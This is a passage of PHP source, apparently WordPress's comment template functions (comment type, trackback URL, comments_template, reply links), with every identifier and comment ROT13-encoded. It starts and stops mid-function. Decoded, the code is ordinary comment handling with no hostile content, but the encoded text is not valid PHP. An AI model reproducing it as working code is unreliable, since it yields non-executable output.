	 * @cnenz fgevat     $pbzzrag_vq   Gur pbzzrag VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Pbzzrag $pbzzrag      Gur pbzzrag bowrpg.
	 */
	erghea nccyl_svygref( 'trg_pbzzrag_glcr', $pbzzrag->pbzzrag_glcr, $pbzzrag->pbzzrag_VQ, $pbzzrag );
}

/**
 * Qvfcynlf gur pbzzrag glcr bs gur pheerag pbzzrag.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat|snyfr $pbzzraggkg   Bcgvbany. Fgevat gb qvfcynl sbe pbzzrag glcr. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $genpxonpxgkg Bcgvbany. Fgevat gb qvfcynl sbe genpxonpx glcr. Qrsnhyg snyfr.
 * @cnenz fgevat|snyfr $cvatonpxgkg  Bcgvbany. Fgevat gb qvfcynl sbe cvatonpx glcr. Qrsnhyg snyfr.
 */
shapgvba pbzzrag_glcr( $pbzzraggkg = snyfr, $genpxonpxgkg = snyfr, $cvatonpxgkg = snyfr ) {
	vs ( snyfr === $pbzzraggkg ) {
		$pbzzraggkg = _k( 'Pbzzrag', 'abha' );
	}
	vs ( snyfr === $genpxonpxgkg ) {
		$genpxonpxgkg = __( 'Genpxonpx' );
	}
	vs ( snyfr === $cvatonpxgkg ) {
		$cvatonpxgkg = __( 'Cvatonpx' );
	}
	$glcr = trg_pbzzrag_glcr();
	fjvgpu ( $glcr ) {
		pnfr 'genpxonpx':
			rpub $genpxonpxgkg;
			oernx;
		pnfr 'cvatonpx':
			rpub $cvatonpxgkg;
			oernx;
		qrsnhyg:
			rpub $pbzzraggkg;
	}
}

/**
 * Ergevrirf gur pheerag cbfg'f genpxonpx HEY.
 *
 * Gurer vf n purpx gb frr vs creznyvax'f unir orra ranoyrq naq vs fb, jvyy
 * ergevrir gur cerggl cngu. Vs creznyvaxf jrera'g ranoyrq, gur VQ bs gur
 * pheerag cbfg vf hfrq naq nccraqrq gb gur pbeerpg cntr gb tb gb.
 *
 * @fvapr 1.5.0
 *
 * @erghea fgevat Gur genpxonpx HEY nsgre orvat svygrerq.
 */
shapgvba trg_genpxonpx_hey() {
	vs ( trg_bcgvba( 'creznyvax_fgehpgher' ) ) {
		$genpxonpx_hey = genvyvatfynfuvg( trg_creznyvax() ) . hfre_genvyvatfynfuvg( 'genpxonpx', 'fvatyr_genpxonpx' );
	} ryfr {
		$genpxonpx_hey = trg_bcgvba( 'fvgrhey' ) . '/jc-genpxonpx.cuc?c=' . trg_gur_VQ();
	}

	/**
	 * Svygref gur erghearq genpxonpx HEY.
	 *
	 * @fvapr 2.2.0
	 *
	 * @cnenz fgevat $genpxonpx_hey Gur genpxonpx HEY.
	 */
	erghea nccyl_svygref( 'genpxonpx_hey', $genpxonpx_hey );
}

/**
 * Qvfcynlf gur pheerag cbfg'f genpxonpx HEY.
 *
 * @fvapr 0.71
 *
 * @cnenz obby $qrcerpngrq_rpub Abg hfrq.
 * @erghea ibvq|fgevat Fubhyq bayl or hfrq gb rpub gur genpxonpx HEY, hfr trg_genpxonpx_hey()
 *                     sbe gur erfhyg vafgrnq.
 */
shapgvba genpxonpx_hey( $qrcerpngrq_rpub = gehr ) {
	vs ( gehr !== $qrcerpngrq_rpub ) {
		_qrcerpngrq_nethzrag(
			__SHAPGVBA__,
			'2.5.0',
			fcevags(
				/* genafyngbef: %f: trg_genpxonpx_hey() */
				__( 'Hfr %f vafgrnq vs lbh qb abg jnag gur inyhr rpubrq.' ),
				'<pbqr>trg_genpxonpx_hey()</pbqr>'
			)
		);
	}

	vs ( $qrcerpngrq_rpub ) {
		rpub trg_genpxonpx_hey();
	} ryfr {
		erghea trg_genpxonpx_hey();
	}
}

/**
 * Trarengrf naq qvfcynlf gur EQS sbe gur genpxonpx vasbezngvba bs pheerag cbfg.
 *
 * Qrcerpngrq va 3.0.0, naq erfgberq va 3.0.1.
 *
 * @fvapr 0.71
 *
 * @cnenz vag|fgevat $qrcerpngrq Abg hfrq (Jnf $gvzrmbar = 0).
 */
shapgvba genpxonpx_eqs( $qrcerpngrq = '' ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '2.5.0' );
	}

	vs ( vffrg( $_FREIRE['UGGC_HFRE_NTRAG'] ) && snyfr !== fgevcbf( $_FREIRE['UGGC_HFRE_NTRAG'], 'J3P_Inyvqngbe' ) ) {
		erghea;
	}

	rpub '<eqs:EQS kzyaf:eqs=\"uggc://jjj.j3.bet/1999/02/22-eqs-flagnk-af#\"
			kzyaf:qp=\"uggc://chey.bet/qp/ryrzragf/1.1/\"
			kzyaf:genpxonpx=\"uggc://znqfxvyyf.pbz/choyvp/kzy/eff/zbqhyr/genpxonpx/\">
		<eqs:Qrfpevcgvba eqs:nobhg=\"';
	gur_creznyvax();
	rpub '\"' . \"\a\";
	rpub '    qp:vqragvsvre=\"';
	gur_creznyvax();
	rpub '\"' . \"\a\";
	rpub '    qp:gvgyr=\"' . fge_ercynpr( '--', '&#k2q;&#k2q;', jcgrkghevmr( fgevc_gntf( trg_gur_gvgyr() ) ) ) . '\"' . \"\a\";
	rpub '    genpxonpx:cvat=\"' . trg_genpxonpx_hey() . '\"' . \" />\a\";
	rpub '</eqs:EQS>';
}

/**
 * Qrgrezvarf jurgure gur pheerag cbfg vf bcra sbe pbzzragf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @erghea obby Gehr vs gur pbzzragf ner bcra.
 */
shapgvba pbzzragf_bcra( $cbfg = ahyy ) {
	$_cbfg = trg_cbfg( $cbfg );

	$cbfg_vq       = $_cbfg ? $_cbfg->VQ : 0;
	$pbzzragf_bcra = ( $_cbfg && ( 'bcra' === $_cbfg->pbzzrag_fgnghf ) );

	/**
	 * Svygref jurgure gur pheerag cbfg vf bcra sbe pbzzragf.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz obby $pbzzragf_bcra Jurgure gur pheerag cbfg vf bcra sbe pbzzragf.
	 * @cnenz vag  $cbfg_vq       Gur cbfg VQ.
	 */
	erghea nccyl_svygref( 'pbzzragf_bcra', $pbzzragf_bcra, $cbfg_vq );
}

/**
 * Qrgrezvarf jurgure gur pheerag cbfg vf bcra sbe cvatf.
 *
 * Sbe zber vasbezngvba ba guvf naq fvzvyne gurzr shapgvbaf, purpx bhg
 * gur {@yvax uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/pbaqvgvbany-gntf/
 * Pbaqvgvbany Gntf} negvpyr va gur Gurzr Qrirybcre Unaqobbx.
 *
 * @fvapr 1.5.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg pheerag cbfg.
 * @erghea obby Gehr vs cvatf ner npprcgrq
 */
shapgvba cvatf_bcra( $cbfg = ahyy ) {
	$_cbfg = trg_cbfg( $cbfg );

	$cbfg_vq    = $_cbfg ? $_cbfg->VQ : 0;
	$cvatf_bcra = ( $_cbfg && ( 'bcra' === $_cbfg->cvat_fgnghf ) );

	/**
	 * Svygref jurgure gur pheerag cbfg vf bcra sbe cvatf.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz obby $cvatf_bcra Jurgure gur pheerag cbfg vf bcra sbe cvatf.
	 * @cnenz vag  $cbfg_vq    Gur cbfg VQ.
	 */
	erghea nccyl_svygref( 'cvatf_bcra', $cvatf_bcra, $cbfg_vq );
}

/**
 * Qvfcynlf sbez gbxra sbe hasvygrerq pbzzragf.
 *
 * Jvyy bayl qvfcynl abapr gbxra vs gur pheerag hfre unf crezvffvbaf sbe
 * hasvygrerq ugzy. Jba'g qvfcynl gur gbxra sbe bgure hfref.
 *
 * Gur shapgvba jnf onpxcbegrq gb 2.0.10 naq jnf nqqrq gb irefvbaf 2.1.3 naq
 * nobir. Qbrf abg rkvfg va irefvbaf cevbe gb 2.0.10 va gur 2.0 oenapu naq va
 * gur 2.1 oenapu, cevbe gb 2.1.3. Grpuavpnyyl nqqrq va 2.2.0.
 *
 * Onpxcbegrq gb 2.0.10.
 *
 * @fvapr 2.1.3
 */
shapgvba jc_pbzzrag_sbez_hasvygrerq_ugzy_abapr() {
	$cbfg    = trg_cbfg();
	$cbfg_vq = $cbfg ? $cbfg->VQ : 0;

	vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
		jc_abapr_svryq( 'hasvygrerq-ugzy-pbzzrag_' . $cbfg_vq, '_jc_hasvygrerq_ugzy_pbzzrag_qvfnoyrq', snyfr );
		jc_cevag_vayvar_fpevcg_gnt( \"(shapgvba(){vs(jvaqbj===jvaqbj.cnerag){qbphzrag.trgRyrzragOlVq('_jc_hasvygrerq_ugzy_pbzzrag_qvfnoyrq').anzr='_jc_hasvygrerq_ugzy_pbzzrag';}})();\" );
	}
}

/**
 * Ybnqf gur pbzzrag grzcyngr fcrpvsvrq va $svyr.
 *
 * Jvyy abg qvfcynl gur pbzzragf grzcyngr vs abg ba fvatyr cbfg be cntr, be vs
 * gur cbfg qbrf abg unir pbzzragf.
 *
 * Hfrf gur JbeqCerff qngnonfr bowrpg gb dhrel sbe gur pbzzragf. Gur pbzzragf
 * ner cnffrq guebhtu gur {@frr 'pbzzragf_neenl'} svygre ubbx jvgu gur yvfg bs pbzzragf
 * naq gur cbfg VQ erfcrpgviryl.
 *
 * Gur `$svyr` cngu vf cnffrq guebhtu n svygre ubbx pnyyrq {@frr 'pbzzragf_grzcyngr'},
 * juvpu vapyhqrf gur grzcyngr qverpgbel naq $svyr pbzovarq. Gevrf gur $svygrerq cngu
 * svefg naq vs vg snvyf vg jvyy erdhver gur qrsnhyg pbzzrag grzcyngr sebz gur
 * qrsnhyg gurzr. Vs rvgure qbrf abg rkvfg, gura gur JbeqCerff cebprff jvyy or
 * unygrq. Vg vf nqivfrq sbe gung ernfba, gung gur qrsnhyg gurzr vf abg qryrgrq.
 *
 * Jvyy abg gel gb trg gur pbzzragf vs gur cbfg unf abar.
 *
 * @fvapr 1.5.0
 *
 * @tybony JC_Dhrel   $jc_dhrel           JbeqCerff Dhrel bowrpg.
 * @tybony JC_Cbfg    $cbfg               Tybony cbfg bowrpg.
 * @tybony jcqo       $jcqo               JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony vag        $vq
 * @tybony JC_Pbzzrag $pbzzrag            Tybony pbzzrag bowrpg.
 * @tybony fgevat     $hfre_ybtva
 * @tybony fgevat     $hfre_vqragvgl
 * @tybony obby       $bireevqqra_pcntr
 * @tybony obby       $jvgupbzzragf
 * @tybony fgevat     $jc_fglyrfurrg_cngu Cngu gb pheerag gurzr'f fglyrfurrg qverpgbel.
 * @tybony fgevat     $jc_grzcyngr_cngu   Cngu gb pheerag gurzr'f grzcyngr qverpgbel.
 *
 * @cnenz fgevat $svyr              Bcgvbany. Gur svyr gb ybnq. Qrsnhyg '/pbzzragf.cuc'.
 * @cnenz obby   $frcnengr_pbzzragf Bcgvbany. Jurgure gb frcnengr gur pbzzragf ol pbzzrag glcr.
 *                                  Qrsnhyg snyfr.
 */
shapgvba pbzzragf_grzcyngr( $svyr = '/pbzzragf.cuc', $frcnengr_pbzzragf = snyfr ) {
	tybony $jc_dhrel, $jvgupbzzragf, $cbfg, $jcqo, $vq, $pbzzrag, $hfre_ybtva, $hfre_vqragvgl, $bireevqqra_pcntr, $jc_fglyrfurrg_cngu, $jc_grzcyngr_cngu;

	vs ( ! ( vf_fvatyr() || vf_cntr() || $jvgupbzzragf ) || rzcgl( $cbfg ) ) {
		erghea;
	}

	vs ( rzcgl( $svyr ) ) {
		$svyr = '/pbzzragf.cuc';
	}

	$erd = trg_bcgvba( 'erdhver_anzr_rznvy' );

	/*
	 * Pbzzrag nhgube vasbezngvba srgpurq sebz gur pbzzrag pbbxvrf.
	 */
	$pbzzragre = jc_trg_pheerag_pbzzragre();

	/*
	 * Gur anzr bs gur pheerag pbzzrag nhgube rfpncrq sbe hfr va nggevohgrf.
	 * Rfpncrq ol fnavgvmr_pbzzrag_pbbxvrf().
	 */
	$pbzzrag_nhgube = $pbzzragre['pbzzrag_nhgube'];

	/*
	 * Gur rznvy nqqerff bs gur pheerag pbzzrag nhgube rfpncrq sbe hfr va nggevohgrf.
	 * Rfpncrq ol fnavgvmr_pbzzrag_pbbxvrf().
	 */
	$pbzzrag_nhgube_rznvy = $pbzzragre['pbzzrag_nhgube_rznvy'];

	/*
	 * Gur HEY bs gur pheerag pbzzrag nhgube rfpncrq sbe hfr va nggevohgrf.
	 */
	$pbzzrag_nhgube_hey = rfp_hey( $pbzzragre['pbzzrag_nhgube_hey'] );

	$pbzzrag_netf = neenl(
		'beqreol'       => 'pbzzrag_qngr_tzg',
		'beqre'         => 'NFP',
		'fgnghf'        => 'nccebir',
		'cbfg_vq'       => $cbfg->VQ,
		'ab_sbhaq_ebjf' => snyfr,
	);

	vs ( trg_bcgvba( 'guernq_pbzzragf' ) ) {
		$pbzzrag_netf['uvrenepuvpny'] = 'guernqrq';
	} ryfr {
		$pbzzrag_netf['uvrenepuvpny'] = snyfr;
	}

	vs ( vf_hfre_ybttrq_va() ) {
		$pbzzrag_netf['vapyhqr_hanccebirq'] = neenl( trg_pheerag_hfre_vq() );
	} ryfr {
		$hanccebirq_rznvy = jc_trg_hanccebirq_pbzzrag_nhgube_rznvy();

		vs ( $hanccebirq_rznvy ) {
			$pbzzrag_netf['vapyhqr_hanccebirq'] = neenl( $hanccebirq_rznvy );
		}
	}

	$cre_cntr = 0;
	vs ( trg_bcgvba( 'cntr_pbzzragf' ) ) {
		$cre_cntr = (vag) trg_dhrel_ine( 'pbzzragf_cre_cntr' );
		vs ( 0 === $cre_cntr ) {
			$cre_cntr = (vag) trg_bcgvba( 'pbzzragf_cre_cntr' );
		}

		$pbzzrag_netf['ahzore'] = $cre_cntr;
		$cntr                   = (vag) trg_dhrel_ine( 'pcntr' );

		vs ( $cntr ) {
			$pbzzrag_netf['bssfrg'] = ( $cntr - 1 ) * $cre_cntr;
		} ryfrvs ( 'byqrfg' === trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ) ) {
			$pbzzrag_netf['bssfrg'] = 0;
		} ryfr {
			// Vs srgpuvat gur svefg cntr bs 'arjrfg', jr arrq n gbc-yriry pbzzrag pbhag.
			$gbc_yriry_dhrel = arj JC_Pbzzrag_Dhrel();
			$gbc_yriry_netf  = neenl(
				'pbhag'   => gehr,
				'beqreol' => snyfr,
				'cbfg_vq' => $cbfg->VQ,
				'fgnghf'  => 'nccebir',
			);

			vs ( $pbzzrag_netf['uvrenepuvpny'] ) {
				$gbc_yriry_netf['cnerag'] = 0;
			}

			vs ( vffrg( $pbzzrag_netf['vapyhqr_hanccebirq'] ) ) {
				$gbc_yriry_netf['vapyhqr_hanccebirq'] = $pbzzrag_netf['vapyhqr_hanccebirq'];
			}

			/**
			 * Svygref gur nethzragf hfrq va gur gbc yriry pbzzragf dhrel.
			 *
			 * @fvapr 5.6.0
			 *
			 * @frr JC_Pbzzrag_Dhrel::__pbafgehpg()
			 *
			 * @cnenz neenl $gbc_yriry_netf {
			 *     Gur gbc yriry dhrel nethzragf sbe gur pbzzragf grzcyngr.
			 *
			 *     @glcr obby         $pbhag   Jurgure gb erghea n pbzzrag pbhag.
			 *     @glcr fgevat|neenl $beqreol Gur svryq(f) gb beqre ol.
			 *     @glcr vag          $cbfg_vq Gur cbfg VQ.
			 *     @glcr fgevat|neenl $fgnghf  Gur pbzzrag fgnghf gb yvzvg erfhygf ol.
			 * }
			 */
			$gbc_yriry_netf = nccyl_svygref( 'pbzzragf_grzcyngr_gbc_yriry_dhrel_netf', $gbc_yriry_netf );

			$gbc_yriry_pbhag = $gbc_yriry_dhrel->dhrel( $gbc_yriry_netf );

			$pbzzrag_netf['bssfrg'] = ( (vag) prvy( $gbc_yriry_pbhag / $cre_cntr ) - 1 ) * $cre_cntr;
		}
	}

	/**
	 * Svygref gur nethzragf hfrq gb dhrel pbzzragf va pbzzragf_grzcyngr().
	 *
	 * @fvapr 4.5.0
	 *
	 * @frr JC_Pbzzrag_Dhrel::__pbafgehpg()
	 *
	 * @cnenz neenl $pbzzrag_netf {
	 *     Neenl bs JC_Pbzzrag_Dhrel nethzragf.
	 *
	 *     @glcr fgevat|neenl $beqreol                   Svryq(f) gb beqre ol.
	 *     @glcr fgevat       $beqre                     Beqre bs erfhygf. Npprcgf 'NFP' be 'QRFP'.
	 *     @glcr fgevat       $fgnghf                    Pbzzrag fgnghf.
	 *     @glcr neenl        $vapyhqr_hanccebirq        Neenl bs VQf be rznvy nqqerffrf jubfr hanccebirq pbzzragf
	 *                                                   jvyy or vapyhqrq va erfhygf.
	 *     @glcr vag          $cbfg_vq                   VQ bs gur cbfg.
	 *     @glcr obby         $ab_sbhaq_ebjf             Jurgure gb ersenva sebz dhrelvat sbe sbhaq ebjf.
	 *     @glcr obby         $hcqngr_pbzzrag_zrgn_pnpur Jurgure gb cevzr pnpur sbe pbzzrag zrgn.
	 *     @glcr obby|fgevat  $uvrenepuvpny              Jurgure gb dhrel sbe pbzzragf uvrenepuvpnyyl.
	 *     @glcr vag          $bssfrg                    Pbzzrag bssfrg.
	 *     @glcr vag          $ahzore                    Ahzore bs pbzzragf gb srgpu.
	 * }
	 */
	$pbzzrag_netf = nccyl_svygref( 'pbzzragf_grzcyngr_dhrel_netf', $pbzzrag_netf );

	$pbzzrag_dhrel = arj JC_Pbzzrag_Dhrel( $pbzzrag_netf );
	$_pbzzragf     = $pbzzrag_dhrel->pbzzragf;

	// Gerrf zhfg or synggrarq orsber gurl'er cnffrq gb gur jnyxre.
	vs ( $pbzzrag_netf['uvrenepuvpny'] ) {
		$pbzzragf_syng = neenl();
		sbernpu ( $_pbzzragf nf $_pbzzrag ) {
			$pbzzragf_syng[]  = $_pbzzrag;
			$pbzzrag_puvyqera = $_pbzzrag->trg_puvyqera(
				neenl(
					'sbezng'  => 'syng',
					'fgnghf'  => $pbzzrag_netf['fgnghf'],
					'beqreol' => $pbzzrag_netf['beqreol'],
				)
			);

			sbernpu ( $pbzzrag_puvyqera nf $pbzzrag_puvyq ) {
				$pbzzragf_syng[] = $pbzzrag_puvyq;
			}
		}
	} ryfr {
		$pbzzragf_syng = $_pbzzragf;
	}

	/**
	 * Svygref gur pbzzragf neenl.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz neenl $pbzzragf Neenl bs pbzzragf fhccyvrq gb gur pbzzragf grzcyngr.
	 * @cnenz vag   $cbfg_vq  Cbfg VQ.
	 */
	$jc_dhrel->pbzzragf = nccyl_svygref( 'pbzzragf_neenl', $pbzzragf_syng, $cbfg->VQ );

	$pbzzragf                        = &$jc_dhrel->pbzzragf;
	$jc_dhrel->pbzzrag_pbhag         = pbhag( $jc_dhrel->pbzzragf );
	$jc_dhrel->znk_ahz_pbzzrag_cntrf = $pbzzrag_dhrel->znk_ahz_cntrf;

	vs ( $frcnengr_pbzzragf ) {
		$jc_dhrel->pbzzragf_ol_glcr = frcnengr_pbzzragf( $pbzzragf );
		$pbzzragf_ol_glcr           = &$jc_dhrel->pbzzragf_ol_glcr;
	} ryfr {
		$jc_dhrel->pbzzragf_ol_glcr = neenl();
	}

	$bireevqqra_pcntr = snyfr;

	vs ( '' === trg_dhrel_ine( 'pcntr' ) && $jc_dhrel->znk_ahz_pbzzrag_cntrf > 1 ) {
		frg_dhrel_ine( 'pcntr', 'arjrfg' === trg_bcgvba( 'qrsnhyg_pbzzragf_cntr' ) ? trg_pbzzrag_cntrf_pbhag() : 1 );
		$bireevqqra_pcntr = gehr;
	}

	vs ( ! qrsvarq( 'PBZZRAGF_GRZCYNGR' ) ) {
		qrsvar( 'PBZZRAGF_GRZCYNGR', gehr );
	}

	$gurzr_grzcyngr = genvyvatfynfuvg( $jc_fglyrfurrg_cngu ) . $svyr;

	/**
	 * Svygref gur cngu gb gur gurzr grzcyngr svyr hfrq sbe gur pbzzragf grzcyngr.
	 *
	 * @fvapr 1.5.1
	 *
	 * @cnenz fgevat $gurzr_grzcyngr Gur cngu gb gur gurzr grzcyngr svyr.
	 */
	$vapyhqr = nccyl_svygref( 'pbzzragf_grzcyngr', $gurzr_grzcyngr );

	vs ( svyr_rkvfgf( $vapyhqr ) ) {
		erdhver $vapyhqr;
	} ryfrvs ( svyr_rkvfgf( genvyvatfynfuvg( $jc_grzcyngr_cngu ) . $svyr ) ) {
		erdhver genvyvatfynfuvg( $jc_grzcyngr_cngu ) . $svyr;
	} ryfr { // Onpxjneq pbzcng pbqr jvyy or erzbirq va n shgher eryrnfr.
		erdhver NOFCNGU . JCVAP . '/gurzr-pbzcng/pbzzragf.cuc';
	}
}

/**
 * Qvfcynlf gur yvax gb gur pbzzragf sbe gur pheerag cbfg VQ.
 *
 * @fvapr 0.71
 *
 * @cnenz snyfr|fgevat $mreb      Bcgvbany. Fgevat gb qvfcynl jura ab pbzzragf. Qrsnhyg snyfr.
 * @cnenz snyfr|fgevat $bar       Bcgvbany. Fgevat gb qvfcynl jura bayl bar pbzzrag vf ninvynoyr. Qrsnhyg snyfr.
 * @cnenz snyfr|fgevat $zber      Bcgvbany. Fgevat gb qvfcynl jura gurer ner zber guna bar pbzzrag. Qrsnhyg snyfr.
 * @cnenz fgevat       $pff_pynff Bcgvbany. PFF pynff gb hfr sbe pbzzragf. Qrsnhyg rzcgl.
 * @cnenz snyfr|fgevat $abar      Bcgvbany. Fgevat gb qvfcynl jura pbzzragf unir orra ghearq bss. Qrsnhyg snyfr.
 */
shapgvba pbzzragf_cbchc_yvax( $mreb = snyfr, $bar = snyfr, $zber = snyfr, $pff_pynff = '', $abar = snyfr ) {
	$cbfg_vq         = trg_gur_VQ();
	$cbfg_gvgyr      = trg_gur_gvgyr();
	$pbzzragf_ahzore = (vag) trg_pbzzragf_ahzore( $cbfg_vq );

	vs ( snyfr === $mreb ) {
		/* genafyngbef: %f: Cbfg gvgyr. */
		$mreb = fcevags( __( 'Ab Pbzzragf<fcna pynff=\"fperra-ernqre-grkg\"> ba %f</fcna>' ), $cbfg_gvgyr );
	}

	vs ( snyfr === $bar ) {
		/* genafyngbef: %f: Cbfg gvgyr. */
		$bar = fcevags( __( '1 Pbzzrag<fcna pynff=\"fperra-ernqre-grkg\"> ba %f</fcna>' ), $cbfg_gvgyr );
	}

	vs ( snyfr === $zber ) {
		/* genafyngbef: 1: Ahzore bs pbzzragf, 2: Cbfg gvgyr. */
		$zber = _a(
			'%1$f Pbzzrag<fcna pynff=\"fperra-ernqre-grkg\"> ba %2$f</fcna>',
			'%1$f Pbzzragf<fcna pynff=\"fperra-ernqre-grkg\"> ba %2$f</fcna>',
			$pbzzragf_ahzore
		);
		$zber = fcevags( $zber, ahzore_sbezng_v18a( $pbzzragf_ahzore ), $cbfg_gvgyr );
	}

	vs ( snyfr === $abar ) {
		/* genafyngbef: %f: Cbfg gvgyr. */
		$abar = fcevags( __( 'Pbzzragf Bss<fcna pynff=\"fperra-ernqre-grkg\"> ba %f</fcna>' ), $cbfg_gvgyr );
	}

	vs ( 0 === $pbzzragf_ahzore && ! pbzzragf_bcra() && ! cvatf_bcra() ) {
		cevags(
			'<fcna%1$f>%2$f</fcna>',
			! rzcgl( $pff_pynff ) ? ' pynff=\"' . rfp_ngge( $pff_pynff ) . '\"' : '',
			$abar
		);
		erghea;
	}

	vs ( cbfg_cnffjbeq_erdhverq() ) {
		_r( 'Ragre lbhe cnffjbeq gb ivrj pbzzragf.' );
		erghea;
	}

	vs ( 0 === $pbzzragf_ahzore ) {
		$erfcbaq_yvax = trg_creznyvax() . '#erfcbaq';
		/**
		 * Svygref gur erfcbaq yvax jura n cbfg unf ab pbzzragf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat $erfcbaq_yvax Gur qrsnhyg erfcbafr yvax.
		 * @cnenz vag    $cbfg_vq      Gur cbfg VQ.
		 */
		$pbzzragf_yvax = nccyl_svygref( 'erfcbaq_yvax', $erfcbaq_yvax, $cbfg_vq );
	} ryfr {
		$pbzzragf_yvax = trg_pbzzragf_yvax();
	}

	$yvax_nggevohgrf = '';

	/**
	 * Svygref gur pbzzragf yvax nggevohgrf sbe qvfcynl.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $yvax_nggevohgrf Gur pbzzragf yvax nggevohgrf. Qrsnhyg rzcgl.
	 */
	$yvax_nggevohgrf = nccyl_svygref( 'pbzzragf_cbchc_yvax_nggevohgrf', $yvax_nggevohgrf );

	cevags(
		'<n uers=\"%1$f\"%2$f%3$f>%4$f</n>',
		rfp_hey( $pbzzragf_yvax ),
		! rzcgl( $pff_pynff ) ? ' pynff=\"' . $pff_pynff . '\" ' : '',
		$yvax_nggevohgrf,
		trg_pbzzragf_ahzore_grkg( $mreb, $bar, $zber )
	);
}

/**
 * Ergevrirf UGZY pbagrag sbe ercyl gb pbzzrag yvax.
 *
 * @fvapr 2.7.0
 * @fvapr 4.4.0 Nqqrq gur novyvgl sbe `$pbzzrag` gb nyfb npprcg n JC_Pbzzrag bowrpg.
 *
 * @cnenz neenl          $netf {
 *     Bcgvbany. Bireevqr qrsnhyg nethzragf.
 *
 *     @glcr fgevat $nqq_orybj          Gur svefg cneg bs gur fryrpgbe hfrq gb vqragvsl gur pbzzrag gb erfcbaq orybj.
 *                                      Gur erfhygvat inyhr vf cnffrq nf gur svefg cnenzrgre gb nqqPbzzrag.zbirSbez(),
 *                                      pbapngrangrq nf $nqq_orybj-$pbzzrag->pbzzrag_VQ. Qrsnhyg 'pbzzrag'.
 *     @glcr fgevat $erfcbaq_vq         Gur fryrpgbe vqragvslvat gur erfcbaqvat pbzzrag. Cnffrq nf gur guveq cnenzrgre
 *                                      gb nqqPbzzrag.zbirSbez(), naq nccraqrq gb gur yvax HEY nf n unfu inyhr.
 *                                      Qrsnhyg 'erfcbaq'.
 *     @glcr fgevat $ercyl_grkg         Gur ivfvoyr grkg bs gur Ercyl yvax. Qrsnhyg 'Ercyl'.
 *     @glcr fgevat $ercyl_gb_grkg      Gur npprffvoyr anzr bs gur Ercyl yvax, hfvat `%f` nf n cynprubyqre
 *                                      sbe gur pbzzrag nhgube'f anzr. Qrsnhyg 'Ercyl gb %f'.
 *                                      Fubhyq fgneg jvgu gur ivfvoyr `ercyl_grkg` inyhr.
 *     @glcr obby   $fubj_ercyl_gb_grkg Jurgure gb hfr `ercyl_gb_grkg` nf ivfvoyr yvax grkg. Qrsnhyg snyfr.
 *     @glcr fgevat $ybtva_grkg         Gur grkg bs gur yvax gb ercyl vs ybttrq bhg. Qrsnhyg 'Ybt va gb Ercyl'.
 *     @glcr vag    $znk_qrcgu          Gur znk qrcgu bs gur pbzzrag gerr. Qrsnhyg 0.
 *     @glcr vag    $qrcgu              Gur qrcgu bs gur arj pbzzrag. Zhfg or terngre guna 0 naq yrff guna gur inyhr
 *                                      bs gur 'guernq_pbzzragf_qrcgu' bcgvba frg va Frggvatf > Qvfphffvba. Qrsnhyg 0.
 *     @glcr fgevat $orsber             Gur grkg be UGZY gb nqq orsber gur ercyl yvax. Qrsnhyg rzcgl.
 *     @glcr fgevat $nsgre              Gur grkg be UGZY gb nqq nsgre gur ercyl yvax. Qrsnhyg rzcgl.
 * }
 * @cnenz vag|JC_Pbzzrag $pbzzrag Bcgvbany. Pbzzrag orvat ercyvrq gb. Qrsnhyg pheerag pbzzrag.
 * @cnenz vag|JC_Cbfg    $cbfg    Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg gur pbzzrag vf tbvat gb or qvfcynlrq ba.
 *                                Qrsnhyg pheerag cbfg.
 * @erghea fgevat|snyfr|ahyy Yvax gb fubj pbzzrag sbez, vs fhpprffshy. Snyfr, vs pbzzragf ner pybfrq.
 */
shapgvba trg_pbzzrag_ercyl_yvax( $netf = neenl(), $pbzzrag = ahyy, $cbfg = ahyy ) {
	$qrsnhygf = neenl(
		'nqq_orybj'          => 'pbzzrag',
		'erfcbaq_vq'         => 'erfcbaq',
		'ercyl_grkg'         => __( 'Ercyl' ),
		/* genafyngbef: Pbzzrag ercyl ohggba grkg. %f: Pbzzrag nhgube anzr. */
		'ercyl_gb_grkg'      => __( 'Ercyl gb %f' ),
		'ybtva_grkg'         => __( 'Ybt va gb Ercyl' ),
		'znk_qrcgu'          => 0,
		'qrcgu'              => 0,
		'orsber'             => '',
		'nsgre'              => '',
		'fubj_ercyl_gb_grkg' => snyfr,
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$netf['znk_qrcgu'] = (vag) $netf['znk_qrcgu'];
	$netf['qrcgu']     = (vag) $netf['qrcgu'];

	vs ( 0 === $netf['qrcgu'] || $netf['znk_qrcgu'] <= $netf['qrcgu'] ) {
		erghea;
	}

	$pbzzrag = trg_pbzzrag( $pbzzrag );

	vs ( rzcgl( $pbzzrag ) ) {
		erghea;
	}

	vs ( rzcgl( $cbfg ) ) {
		$cbfg = $pbzzrag->pbzzrag_cbfg_VQ;
	}

	$cbfg = trg_cbfg( $cbfg );

	vs ( ! pbzzragf_bcra( $cbfg->VQ ) ) {
		erghea snyfr;
	}

	vs ( trg_bcgvba( 'cntr_pbzzragf' ) ) {
		$creznyvax = fge_ercynpr( '#pbzzrag-' . $pbzzrag->pbzzrag_VQ, '', trg_pbzzrag_yvax( $pbzzrag ) );
